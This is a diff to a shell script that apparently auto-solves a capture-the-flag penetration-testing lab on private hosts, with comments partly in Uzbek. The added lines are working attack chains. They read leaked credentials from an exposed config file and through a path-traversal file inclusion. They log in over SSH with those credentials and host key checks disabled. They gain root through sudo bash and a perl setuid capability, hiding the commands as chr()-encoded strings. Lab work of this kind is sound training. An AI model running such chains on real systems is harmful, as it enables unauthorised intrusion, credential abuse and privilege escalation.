@@ -26,6 +26,22 @@ chk "EJPT{" "$UF" "web-01 USER flag (crack -> SSH foothold)"
 ROOT=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@172.20.0.10 'sudo /usr/bin/python3 -c \"import os;os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))\"' 2>/dev/null")
 chk "EJPT{" "$ROOT" "web-01 ROOT flag (sudo python3)"
 
+echo "### 1a) web-easy: ochiq config -> SSH deploy -> sudo bash -> root"
+EC=$($A "curl -s http://172.20.0.40/config.old | grep -oE 'ssh_pass = .+'")
+chk "D3ploy2024!" "$EC" "web-easy: config.old SSH cred sizdi"
+EUF=$($A "sshpass -p 'D3ploy2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@172.20.0.40 'cat /home/deploy/user.txt' 2>/dev/null")
+chk "EJPT{" "$EUF" "web-easy USER flag (SSH)"
+ERF=$($A "sshpass -p 'D3ploy2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@172.20.0.40 'sudo /bin/bash -c \"cat /root/root.txt\"' 2>/dev/null")
+chk "EJPT{" "$ERF" "web-easy ROOT flag (sudo bash)"
+
+echo "### 1b) web-hard: LFI -> SSH webadmin -> perl cap_setuid -> root"
+HL=$($A "curl -s 'http://172.20.0.50/view.php?page=../../../../opt/monitor/deploy_notes.txt' | grep -oE 'pass: .+'")
+chk "W3bM0n1t0r2024!" "$HL" "web-hard: LFI SSH cred sizdi"
+HUF=$($A "sshpass -p 'W3bM0n1t0r2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@172.20.0.50 'cat /home/webadmin/user.txt' 2>/dev/null")
+chk "EJPT{" "$HUF" "web-hard USER flag (LFI->SSH)"
+HRF=$($A "sshpass -p 'W3bM0n1t0r2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@172.20.0.50 'perl -e \"use POSIX qw(setuid); POSIX::setuid(0); exec chr(47).chr(98).chr(105).chr(110).chr(47).chr(99).chr(97).chr(116).chr(32).chr(47).chr(114).chr(111).chr(111).chr(116).chr(47).chr(114).chr(111).chr(111).chr(116).chr(46).chr(116).chr(120).chr(116);\"' 2>/dev/null")
+chk "EJPT{" "$HRF" "web-hard ROOT flag (perl cap_setuid)"
+
 echo "### 2) linux-02: anon FTP hint -> ssh bob -> SUID find -> root"
 FTP=$($A "curl -s ftp://172.20.0.20/note_to_bob.txt")
 chk "football" "$FTP" "anon FTP note (bob parol hint)"
